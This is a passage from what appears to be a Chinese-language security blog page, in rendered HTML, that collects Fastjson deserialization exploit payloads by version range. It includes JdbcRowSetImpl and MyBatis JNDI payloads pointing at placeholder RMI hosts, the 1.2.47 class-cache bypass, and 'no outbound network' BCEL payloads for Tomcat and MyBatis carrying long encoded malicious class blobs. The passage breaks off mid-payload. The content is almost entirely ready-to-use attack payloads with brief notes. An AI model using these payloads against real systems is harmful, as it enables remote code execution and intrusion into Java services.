class="hljs-selector-class">.setAutoTypeSupport</span>(true);  <span class="hljs-comment">//开启autoTypeSupport</span>&#123;&quot;<span class="hljs-keyword">@type</span><span class="hljs-string">&quot;:&quot;</span>[com.sun.rowset.JdbcRowSetImpl<span class="hljs-string">&quot;[&#123;&quot;</span>dataSourceName<span class="hljs-string">&quot;:&quot;</span><span class="hljs-attribute">rmi</span>://<span class="hljs-attribute">vps</span>:port/Exploit<span class="hljs-string">&quot;, &quot;</span>autoCommit<span class="hljs-string">&quot;:true&#125;</span></code></pre></div><h2 id="1-2-25-1-2-45-（mybatis"><a href="#1-2-25-1-2-45-（mybatis" class="headerlink" title="1.2.25-1.2.45 （mybatis&lt;3.5.0）"></a>1.2.25-1.2.45 （mybatis&lt;3.5.0）</h2><p><code>data_source</code>      有 <code>initial_context</code>时写在<code>initial_context</code></p><div class="code-wrapper"><pre><code class="hljs python">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="hljs-string">&quot;properties&quot;</span>:&#123;<span class="hljs-string">&quot;data_source&quot;</span>:<span class="hljs-string">&quot;rmi://vps:port/TouchFile&quot;</span>&#125;&#125;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="hljs-string">&quot;properties&quot;</span>:&#123;<span class="hljs-string">&quot;data_source&quot;</span>:<span class="hljs-string">&quot;2333&quot;</span>,<span class="hljs-string">&quot;initial_context&quot;</span>:<span class="hljs-string">&quot;rmi://ip:port/TouchFile&quot;</span>&#125;&#125;</code></pre></div><h2 id="1-2-25-1-2-47-最常用"><a href="#1-2-25-1-2-47-最常用" class="headerlink" title="1.2.25-1.2.47 (最常用)"></a>1.2.25-1.2.47 (最常用)</h2><p>第一次缓存，第二次因为缓存绕过检测</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;rmi://vps/TouchFile&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><h1 id="fastjson不出网"><a href="#fastjson不出网" class="headerlink" title="fastjson不出网"></a>fastjson不出网</h1><p><a href="https://xz.aliyun.com/t/12492#toc-4">Fastjson不出网利用总结 - 先知社区 (aliyun.com)</a></p><h2 id="TemplatesImpl-1"><a href="#TemplatesImpl-1" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>修改恶意类代码，命令执行或内存马</p><h2 id="BCEL"><a href="#BCEL" class="headerlink" title="BCEL"></a>BCEL</h2><h3 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h3><p>把整体放在key，会调用key.toString()</p><div class="code-wrapper"><pre><code class="hljs powershell">&#123;    &#123;        <span class="hljs-string">&quot;aaa&quot;</span>: &#123;                <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span>,                <span class="hljs-string">&quot;driverClassLoader&quot;</span>: &#123;                    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>                &#125;,                <span class="hljs-string">&quot;driverClassName&quot;</span>: <span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$l</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$I</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$AmRKO</span><span class="hljs-variable">$c2</span><span class="hljs-variable">$40</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$W</span><span class="hljs-variable">$90BmEQ</span><span class="hljs-variable">$f0</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$7e</span><span class="hljs-variable">$81</span><span class="hljs-variable">$H</span><span class="hljs-variable">$b9x</span><span class="hljs-variable">$c3x1</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$Y</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$pb0</span><span class="hljs-variable">$k</span><span class="hljs-variable">$cb</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$c2bmM</span><span class="hljs-variable">$v</span><span class="hljs-variable">$ea</span><span class="hljs-variable">$3f</span><span class="hljs-variable">$f2</span><span class="hljs-variable">$ecE</span><span class="hljs-variable">$8d</span><span class="hljs-variable">$sz</span><span class="hljs-variable">$f7G</span><span class="hljs-variable">$ZgWE</span><span class="hljs-variable">$S</span><span class="hljs-variable">$eda</span><span class="hljs-variable">$a63</span><span class="hljs-variable">$dfcf</span><span class="hljs-variable">$db</span><span class="hljs-variable">$7d</span><span class="hljs-variable">$ffx</span><span class="hljs-variable">$7e</span><span class="hljs-variable">$F</span><span class="hljs-variable">$b0</span><span class="hljs-variable">$86</span><span class="hljs-variable">$82</span><span class="hljs-variable">$894FL</span><span class="hljs-variable">$8cb</span><span class="hljs-variable">$y</span><span class="hljs-variable">$85q</span><span class="hljs-variable">$95</span><span class="hljs-variable">$t</span><span class="hljs-variable">$ML</span><span class="hljs-variable">$g</span><span class="hljs-variable">$982</span><span class="hljs-variable">$91</span><span class="hljs-variable">$c4</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$81</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$D</span><span class="hljs-variable">$b3</span><span class="hljs-variable">$M</span><span class="hljs-variable">$c9u</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$cbh</span><span class="hljs-variable">$83</span><span class="hljs-variable">$n</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$uV</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$S</span><span class="hljs-variable">$9b</span><span class="hljs-variable">$c1</span><span class="hljs-variable">$99</span><span class="hljs-variable">$60</span><span class="hljs-variable">$c88</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$X</span><span class="hljs-variable">$fb</span><span class="hljs-variable">$ed</span><span class="hljs-variable">$cb</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$I</span><span class="hljs-variable">$8f</span><span class="hljs-variable">$dd</span><span class="hljs-variable">$9aG</span><span class="hljs-variable">$9d</span><span class="hljs-variable">$ac</span><span class="hljs-variable">$Tp</span><span class="hljs-variable">$d7</span><span class="hljs-variable">$ab</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$a1T</span><span class="hljs-variable">$f5w3</span><span class="hljs-variable">$R5d</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$3c</span><span class="hljs-variable">$9c</span><span class="hljs-variable">$adk</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$95</span><span class="hljs-variable">$ZR</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$dc</span><span class="hljs-variable">$fb</span><span class="hljs-variable">$b6c</span><span class="hljs-variable">$E</span><span class="hljs-variable">$e7</span><span class="hljs-variable">$9c</span><span class="hljs-variable">$a6</span><span class="hljs-variable">$7b</span><span class="hljs-variable">$ed</span><span class="hljs-variable">$96dP</span><span class="hljs-variable">$da9</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$e5</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$w</span><span class="hljs-variable">$92</span><span class="hljs-variable">$81O4</span><span class="hljs-variable">$bb</span><span class="hljs-variable">$S</span><span class="hljs-variable">$b9</span><span class="hljs-variable">$fcb</span><span class="hljs-variable">$cf</span><span class="hljs-variable">$bd</span><span class="hljs-variable">$d26</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$U</span><span class="hljs-variable">$83Y</span><span class="hljs-variable">$J</span><span class="hljs-variable">$da</span><span class="hljs-variable">$n</span><span class="hljs-variable">$X</span><span class="hljs-variable">$dbR</span><span class="hljs-variable">$d9</span><span class="hljs-variable">$a6</span><span class="hljs-variable">$95</span><span class="hljs-variable">$dd</span><span class="hljs-variable">$aa</span><span class="hljs-variable">$d2Z0</span><span class="hljs-variable">$d1k</span><span class="hljs-variable">$60</span><span class="hljs-variable">$ce</span><span class="hljs-variable">$c2</span><span class="hljs-variable">$3c</span><span class="hljs-variable">$Wh</span><span class="hljs-variable">$k</span><span class="hljs-variable">$ad</span><span class="hljs-variable">$c0</span><span class="hljs-variable">$z</span><span class="hljs-variable">$yb</span><span class="hljs-variable">$89a</span><span class="hljs-variable">$f0</span><span class="hljs-variable">$lo</span><span class="hljs-variable">$861</span><span class="hljs-variable">$dd</span><span class="hljs-variable">$f5</span><span class="hljs-variable">$5c</span><span class="hljs-variable">$bf</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$3aj</span><span class="hljs-variable">$fb</span><span class="hljs-variable">$91</span><span class="hljs-variable">$bc</span><span class="hljs-variable">$U</span><span class="hljs-variable">$jPy</span><span class="hljs-variable">$z</span><span class="hljs-variable">$93</span><span class="hljs-variable">$872g</span><span class="hljs-variable">$e8</span><span class="hljs-variable">$ff</span><span class="hljs-variable">$r</span><span class="hljs-variable">$k</span><span class="hljs-variable">$d4</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$82G</span><span class="hljs-variable">$M</span><span class="hljs-variable">$D</span><span class="hljs-variable">$7f</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$b4W</span><span class="hljs-variable">$5dD</span><span class="hljs-variable">$9d</span><span class="hljs-variable">$oW</span><span class="hljs-variable">$u</span><span class="hljs-variable">$3a</span><span class="hljs-variable">$7f8t</span><span class="hljs-variable">$9e</span><span class="hljs-variable">$84</span><span class="hljs-variable">$b8</span><span class="hljs-variable">$V</span><span class="hljs-variable">$9ca</span><span class="hljs-variable">$b9</span><span class="hljs-variable">$d0</span><span class="hljs-variable">$85V</span><span class="hljs-variable">$a2P</span><span class="hljs-variable">$fa</span><span class="hljs-variable">$f5r</span><span class="hljs-variable">$b7</span><span class="hljs-variable">$e00</span><span class="hljs-variable">$M</span><span class="hljs-variable">$b8h</span><span class="hljs-variable">$b5H0</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$cd</span><span class="hljs-variable">$3cn</span><span class="hljs-variable">$84</span><span class="hljs-variable">$c1</span><span class="hljs-variable">$8d</span><span class="hljs-variable">$fa</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$e5b</span><span class="hljs-variable">$V</span><span class="hljs-variable">$b3H</span><span class="hljs-variable">$d1_SO</span><span class="hljs-variable">$ML</span><span class="hljs-variable">$j</span><span class="hljs-variable">$9e</span><span class="hljs-variable">$a2EU</span><span class="hljs-variable">$892</span><span class="hljs-variable">$a3</span><span class="hljs-variable">$dc</span><span class="hljs-variable">$b3</span><span class="hljs-variable">$f2</span><span class="hljs-variable">$Iv</span><span class="hljs-variable">$afa</span><span class="hljs-variable">$9bbR7</span><span class="hljs-variable">$N</span><span class="hljs-variable">$f4Q</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$be</span><span class="hljs-variable">$I</span><span class="hljs-variable">$c8</span><span class="hljs-variable">$a0</span><span class="hljs-variable">$9fr</span><span class="hljs-variable">$K</span><span class="hljs-variable">$D</span><span class="hljs-variable">$j</span><span class="hljs-variable">$f19</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$g</span><span class="hljs-variable">$h</span><span class="hljs-variable">$7eB</span><span class="hljs-variable">$y</span><span class="hljs-variable">$h</span><span class="hljs-variable">$7f</span><span class="hljs-variable">$40</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$e4</span><span class="hljs-variable">$O</span><span class="hljs-variable">$f6</span><span class="hljs-variable">$ee</span><span class="hljs-variable">$L</span><span class="hljs-variable">$92</span><span class="hljs-variable">$a7</span><span class="hljs-variable">$e4f</span><span class="hljs-variable">$bc</span><span class="hljs-variable">$ddk0M</span><span class="hljs-variable">$d4</span><span class="hljs-variable">$k</span><span class="hljs-variable">$o</span><span class="hljs-variable">$w</span><span class="hljs-variable">$db</span><span class="hljs-variable">$3c</span><span class="hljs-variable">$bd</span><span class="hljs-variable">$B</span><span class="hljs-variable">$ea</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$d4</span><span class="hljs-variable">$ed</span><span class="hljs-variable">$d51OC</span><span class="hljs-variable">$7e</span><span class="hljs-variable">$c6</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$84d1H</span><span class="hljs-variable">$d5</span><span class="hljs-variable">$90</span><span class="hljs-variable">$k</span><span class="hljs-variable">$ls</span><span class="hljs-variable">$M</span><span class="hljs-variable">$e4</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$E</span><span class="hljs-variable">$e4</span><span class="hljs-variable">$f5f</span><span class="hljs-variable">$c3</span><span class="hljs-variable">$9f</span><span class="hljs-variable">$9e</span><span class="hljs-variable">$b2</span><span class="hljs-variable">$c5O</span><span class="hljs-variable">$84</span><span class="hljs-variable">$C</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span>&quot;</span>        &#125;    &#125;: <span class="hljs-string">&quot;bbb&quot;</span>&#125;</code></pre></div><h3 id="mybatis"><a href="#mybatis" class="headerlink" title="mybatis"></a>mybatis</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzAwNzk0NTkxNw==&mid=2247486057&idx=1&sn=6799b8b77f058247705beaa6995dcb82&chksm=9b7721bbac00a8adc3ca7b23590bcb7493fc93091eaf76efe4662b7d6f86068e38d20338c3c1&mpshare=1&scene=2&srcid=1109kLt9Pm0fZdiqQ8zbB0IX&sharer_sharetime=1667995572392&sharer_shareid=917ce1404b071ce27556675ad135266f#rd">参考</a></p><p>1.2.47</p><p>这个要是失败，说明版本在1.2.25-1.2.32之间</p><div class="code-wrapper"><pre><code class="hljs powershell">&#123;<span class="hljs-string">&quot;x&quot;</span>:&#123;<span class="hljs-string">&quot;xxx&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;c&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;www&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;c&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>,<span class="hljs-string">&quot;driverClassLoader&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$l</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$I</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$AmRKO</span><span class="hljs-variable">$c2</span><span class="hljs-variable">$40</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$W</span><span class="hljs-variable">$90BmEQ</span><span class="hljs-variable">$f0</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$7e</span><span class="hljs-variable">$81</span><span class="hljs-variable">$H</span><span class="hljs-variable">$b9x</span><span class="hljs-variable">$c3x1</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$Y</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$pb0</span><span class="hljs-variable">$k</span><span class="hljs-variable">$cb</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$c2bmM</span><span class="hljs-variable">$v</span><span class="hljs-variable">$ea</span><span class="hljs-variable">$3f</span><span class="hljs-variable">$f2</span><span class="hljs-variable">$ecE</span><span class="hljs-variable">$8d</span><span class="hljs-variable">$sz</span><span class="hljs-variable">$f7G</span><span class="hljs-variable">$ZgWE</span><span class="hljs-variable">$S</span><span class="hljs-variable">$eda</span><span class="hljs-variable">$a63</span><span class="hljs-variable">$dfcf</span><span class="hljs-variable">$db</span><span class="hljs-variable">$7d</span><span class="hljs-variable">$ffx</span><span class="hljs-variable">$7e</span><span class="hljs-variable">$F</span><span class="hljs-variable">$b0</span><span class="hljs-variable">$86</span><span class="hljs-variable">$82</span><span class="hljs-variable">$894FL</span><span class="hljs-variable">$8cb</span><span class="hljs-variable">$y</span><span class="hljs-variable">$85q</span><span class="hljs-variable">$95</span><span class="hljs-variable">$t</span><span class="hljs-variable">$ML</span><span class="hljs-variable">$g</span><span class="hljs-variable">$982</span><span class="hljs-variable">$91</span><span class="hljs-variable">$c4</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$81</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$D</span><span class="hljs-variable">$b3</span><span class="hljs-variable">$M</span><span class="hljs-variable">$c9u</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$cbh</span><span class="hljs-variable">$83</span><span class="hljs-variable">$n</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$uV</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$S</span><span class="hljs-variable">$9b</span><span class="hljs-variable">$c1</span><span class="hljs-variable">$99</span><span class="hljs-variable">$60</span><span class="hljs-variable">$c88</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$X</span><span class="hljs-variable">$fb</span><span class="hljs-variable">$ed</span><span class="hljs-variable">$cb</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$I</span><span class="hljs-variable">$8f</span><span class="hljs-variable">$dd</span><span class="hljs-variable">$9aG</span><span class="hljs-variable">$9d</span><span class="hljs-variable">$ac</span><span class="hljs-variable">$Tp</span><span class="hljs-variable">$d7</span><span class="hljs-variable">$ab</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$a1T</span><span class="hljs-variable">$f5w3</span><span class="hljs-variable">$R5d</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$3c</span><span class="hljs-variable">$9c</span><span class="hljs-variable">$adk</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$95</span><span class="hljs-variable">$ZR</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$dc</span><span class="hljs-variable">$fb</span><span class="hljs-variable">$b6c</span><span class="hljs-variable">$E</span><span class="hljs-variable">$e7</span><span class="hljs-variable">$9c</span><span class="hljs-variable">$a6</span><span class="hljs-variable">$7b</span><span class="hljs-variable">$ed</span><span class="hljs-variable">$96dP</span><span class="hljs-variable">$da9</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$e5</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$w</span><span class="hljs-variable">$92</span><span class="hljs-variable">$81O4</span><span class="hljs-variable">$bb</span><span class="hljs-variable">$S</span><span class="hljs-variable">$b9</span><span class="hljs-variable">$fcb</span><span class="hljs-variable">$cf</span><span class="hljs-variable">$bd</span><span class="hljs-variable">$d26</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$U</span><span class="hljs-variable">$83Y</span><span class="hljs-variable">$J</span><span class="hljs-variable">$da</span><span class="hljs-variable">$n</span><span class="hljs-variable">$X</span><span class="hljs-variable">$dbR</span><span class="hljs-variable">$d9</span><span class="hljs-variable">$a6</span><span class="hljs-variable">$95</span><span class="hljs-variable">$dd</span><span class="hljs-variable">$aa</span><span class="hljs-variable">$d2Z0</span><span class="hljs-variable">$d1k</span><span class="hljs-variable">$60</span><span class="hljs-variable">$ce</span><span class="hljs-variable">$c2</span><span class="hljs-variable">$3c</span><span class="hljs-variable">$Wh</span><span class="hljs-variable">$k</span><span class="hljs-variable">$ad</span><span class="hljs-variable">$c0</span><span class="hljs-variable">$z</span><span class="hljs-variable">$yb</span><span class="hljs-variable">$89a</span><span class="hljs-variable">$f0</span><span class="hljs-variable">$lo</span><span class="hljs-variable">$861</span><span class="hljs-variable">$dd</span><span class="hljs-variable">$f5</span><span class="hljs-variable">$5c</span><span class="hljs-variable">$bf</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$3aj</span><span class="hljs-variable">$fb</span><span class="hljs-variable">$91</span><span class="hljs-variable">$bc</span><span class="hljs-variable">$U</span><span class="hljs-variable">$jPy</span><span class="hljs-variable">$z</span><span class="hljs-variable">$93</span><span class="hljs-variable">$872g</span><span class="hljs-variable">$e8</span><span class="hljs-variable">$ff</span><span class="hljs-variable">$r</span><span class="hljs-variable">$k</span><span class="hljs-variable">$d4</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$82G</span><span class="hljs-variable">$M</span><span class="hljs-variable">$D</span><span class="hljs-variable">$7f</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$b4W</span><span class="hljs-variable">$5dD</span><span class="hljs-variable">$9d</span><span class="hljs-variable">$oW</span><span class="hljs-variable">$u</span><span class="hljs-variable">$3a</span><span class="hljs-variable">$7f8t</span><span class="hljs-variable">$9e</span><span class="hljs-variable">$84</span><span class="hljs-variable">$b8</span><span class="hljs-variable">$V</span><span class="hljs-variable">$9ca</span><span class="hljs-variable">$b9</span><span class="hljs-variable">$d0</span><span class="hljs-variable">$85V</span><span class="hljs-variable">$a2P</span><span class="hljs-variable">$fa</span><span class="hljs-variable">$f5r</span><span class="hljs-variable">$b7</span><span class="hljs-variable">$e00</span><span class="hljs-variable">$M</span><span class="hljs-variable">$b8h</span><span class="hljs-variable">$b5H0</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$cd</span><span class="hljs-variable">$3cn</span><span class="hljs-variable">$84</span><span class="hljs-variable">$c1</span><span class="hljs-variable">$8d</span><span class="hljs-variable">$fa</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$e5b</span><span class="hljs-variable">$V</span><span class="hljs-variable">$b3H</span><span class="hljs-variable">$d1_SO</span><span class="hljs-variable">$ML</span><span class="hljs-variable">$j</span><span class="hljs-variable">$9e</span><span class="hljs-variable">$a2EU</span><span class="hljs-variable">$892</span><span class="hljs-variable">$a3</span><span class="hljs-variable">$dc</span><span class="hljs-variable">$b3</span><span class="hljs-variable">$f2</span><span class="hljs-variable">$Iv</span><span class="hljs-variable">$afa</span><span class="hljs-variable">$9bbR7</span><span class="hljs-variable">$N</span><span class="hljs-variable">$f4Q</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$be</span><span class="hljs-variable">$I</span><span class="hljs-variable">$c8</span><span class="hljs-variable">$a0</span><span class="hljs-variable">$9fr</span><span class="hljs-variable">$K</span><span class="hljs-variable">$D</span><span class="hljs-variable">$j</span><span class="hljs-variable">$f19</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$g</span><span class="hljs-variable">$h</span><span class="hljs-variable">$7eB</span><span class="hljs-variable">$y</span><span class="hljs-variable">$h</span><span class="hljs-variable">$7f</span><span class="hljs-variable">$40</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$e4</span><span class="hljs-variable">$O</span><span class="hljs-variable">$f6</span><span class="hljs-variable">$ee</span><span class="hljs-variable">$L</span><span class="hljs-variable">$92</span><span class="hljs-variable">$a7</span><span class="hljs-variable">$e4f</span><span class="hljs-variable">$bc</span><span class="hljs-variable">$ddk0M</span><span class="hljs-variable">$d4</span><span class="hljs-variable">$k</span><span class="hljs-variable">$o</span><span class="hljs-variable">$w</span><span class="hljs-variable">$db</span><span class="hljs-variable">$3c</span><span class="hljs-variable">$bd</span><span class="hljs-variable">$B</span><span class="hljs-variable">$ea</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$d4</span><span class="hljs-variable">$ed</span><span class="hljs-variable">$d51OC</span><span class="hljs-variable">$7e</span><span class="hljs-variable">$c6</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$84d1H</span><span class="hljs-variable">$d5</span><span class="hljs-variable">$90</span><span class="hljs-variable">$k</span><span class="hljs-variable">$ls</span><span class="hljs-variable">$M</span><span class="hljs-variable">$e4</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$E</span><span class="hljs-variable">$e4</span><span class="hljs-variable">$f5f</span><span class="hljs-variable">$c3</span><span class="hljs-variable">$9f</span><span class="hljs-variable">$9e</span><span class="hljs-variable">$b2</span><span class="hljs-variable">$c5O</span><span class="hljs-variable">$84</span><span class="hljs-variable">$C</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span>&quot;</span>&#125;&#125;:&#123;&#125;&#125;&#125;</code></pre></div><h4 id="JSONObject调用getter"><a href="#JSONObject调用getter" class="headerlink" title="JSONObject调用getter"></a>JSONObject调用getter</h4><p>关键是<code>&quot;$ref&quot;: &quot;..&quot;</code></p><p>在JSONObject触发getter之前就已经完成对Field赋值</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;friend&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;driver&quot;</span><span class="hljs-punctuation">:</span><span 